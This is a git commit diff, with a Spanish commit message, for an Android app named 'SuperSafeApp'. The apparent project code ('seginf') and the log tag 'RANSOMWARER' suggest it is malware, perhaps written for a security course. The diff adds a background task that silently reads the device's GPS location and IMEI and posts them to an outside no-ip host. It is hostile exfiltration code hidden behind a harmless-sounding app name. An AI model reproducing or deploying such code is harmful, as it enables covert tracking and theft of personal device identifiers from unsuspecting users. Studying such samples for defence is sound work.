725e6b2fbf134dec79029926b99da2ef8709fad9
Vanesa Stricker <vstricker@monits.com>
2013-11-29 14:06:56 -0300

    Agrego el post al server con la location del usuario y el numero de imai. Para obtener el numero de imai se requiere un permiso nuevo,lo agrego al manifest. Esta sin testear.

--- SuperSafeApp/src/com/seginf/supersafeapp/MainActivity.java
+++ SuperSafeApp/src/com/seginf/supersafeapp/MainActivity.java
@@ -13,6 +13,7 @@ import java.util.Locale;
 import org.apache.http.HttpResponse;
 import org.apache.http.HttpVersion;
 import org.apache.http.NameValuePair;
+import org.apache.http.client.ClientProtocolException;
 import org.apache.http.client.HttpClient;
 import org.apache.http.client.entity.UrlEncodedFormEntity;
 import org.apache.http.client.methods.HttpPost;
@@ -33,6 +34,7 @@ import android.os.AsyncTask;
 import android.os.Bundle;
 import android.os.Environment;
 import android.os.Vibrator;
+import android.telephony.TelephonyManager;
 import android.util.Log;
 import android.view.Menu;
 import android.view.SurfaceView;
@@ -219,10 +221,8 @@ public class MainActivity extends Activity implements Commandable {
 
 			@Override
 			public void onLocationChanged(Location location) {
-				// TODO: send the location to the server
-				// userLocation = location;
 				stopLocationUpdate(locationManager, locationListener);
-				// TODO: send userLocation information to the server
+				uploadLocation(location);
 			}
 		};
 
@@ -243,12 +243,39 @@ public class MainActivity extends Activity implements Commandable {
 		locationManager.removeUpdates(locationListener);
 	}
 
-	// TODO: POST Request
-	// public void uploadLocation() {
-	// HttpPost httppost = new HttpPost("http://manzana.no-ip.org/poster.php");
-	// HttpClient client = new DefaultHttpClient();
-	// client.getParams().setParameter(CoreProtocolPNames.PROTOCOL_VERSION,
-	// HttpVersion.HTTP_1_1);
-	// }
-	//
+	// POST Request
+	private String URL_POST = "http://manzana.no-ip.org/poster.php";
+
+	public void uploadLocation(final Location location) {
+		new AsyncTask< Void,Void,Void>(){
+			protected Void doInBackground(Void... arg0) {
+				try {
+					HttpPost post = new HttpPost(URL_POST);
+        			HttpClient client = new DefaultHttpClient();
+        			client.getParams().setParameter(CoreProtocolPNames.PROTOCOL_VERSION, HttpVersion.HTTP_1_1);
+
+        			List<NameValuePair> content = new ArrayList<NameValuePair>(); 
+
+        			Double latitude = location.getLatitude();
+        	        Double longitude = location.getLongitude();
+        			
+        	        TelephonyManager mngr = (TelephonyManager)getSystemService(Context.TELEPHONY_SERVICE); 
+        	        String imai = mngr.getDeviceId();
+
+        			content.add(new BasicNameValuePair("latitude",latitude.toString()));
+        			content.add(new BasicNameValuePair("longitude",longitude.toString()));
+        			content.add(new BasicNameValuePair("imai",imai));
+        			post.setEntity(new UrlEncodedFormEntity(content));
+
+        			HttpResponse response = client.execute(post);
+
+					Log.d("RANSOMWARER","Server replied: "
+						+ EntityUtils.toString(response.getEntity()));
+				} catch (Exception e) {
+					Log.e("RANSOMWARER", "Exception sending data: ", e);
+				}
+				return null;
+			}			
+		}.execute();                
+	}
 }
